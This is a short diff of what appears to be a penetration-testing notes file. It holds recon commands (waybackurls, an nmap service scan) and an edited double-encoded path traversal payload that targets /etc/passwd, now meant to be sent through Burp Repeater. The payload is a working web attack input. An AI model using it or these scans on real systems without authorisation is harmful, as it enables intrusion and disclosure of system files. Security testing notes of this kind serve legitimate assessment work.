@@ -67,7 +67,7 @@ google dorks :
 
 echo http://example.gov | waybackurls | grep /images/
 
-# Double Encode Payload: ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
+# Double Encode Payload: "www.example.com/images/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"   >> in repeater
   
 ----------------------------------------------------------------------------------------------
 nmap -sV -iL host.txt -oN nmap_scan.txt
